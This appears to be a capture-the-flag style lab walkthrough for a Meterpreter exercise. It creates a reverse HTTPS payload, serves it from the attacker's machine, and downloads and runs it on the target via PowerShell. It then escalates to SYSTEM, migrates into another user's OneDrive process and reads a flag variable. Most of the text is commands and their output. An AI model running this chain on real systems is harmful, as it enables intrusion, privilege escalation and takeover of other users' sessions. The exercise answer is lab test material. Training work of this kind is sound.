Questions
Follow the steps from this section to migrate to the OneDrive.exe process of user offsec. Then, use the Meterpreter post-exploitation feature getenv to display the value of the environment variable Flag and enter it as answer to this exercise.

# Create payload using msfvenom
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.214 LPORT=443 -f exe -o met.exe

# Access to msfconsole
msfconsole
use multi/handler
set payload windows/x64/meterpreter_reverse_https
set LPORT 443
set LHOST tun0
run -j

# start the http server for payload transferring
python3 -m http.server 80

# access to the victim server
nc 192.168.195.223 4444
# open powershell
powershell
iwr -uri http://192.168.45.214/met.exe -Outfile met.exe
.\met.exe

# back to metasploit
sessions -i 1 --timeout 60
meterpreter > idletime
User has been idle for: 35 mins 40 secs
meterpreter > shell
C:\Users\luiza>whoami /priv
...
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
...

meterpreter > getuid
Server username: ITWK01\luiza
meterpreter > getsystem
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > ps 
...
5476   5400  OneDrive.exe        x64   1        ITWK01\offsec                 C:\Users\offsec\AppData\Local\Microsoft\OneDrive\OneDrive.exe
...
meterpreter > migrate 5476
[*] Migrating from 1244 to 5476...
[*] Migration completed successfully.

meterpreter > getuid
meterpreter > getenv Flag

Environment Variables
=====================

Variable  Value
--------  -----
Flag      thisistheanswertothequestion






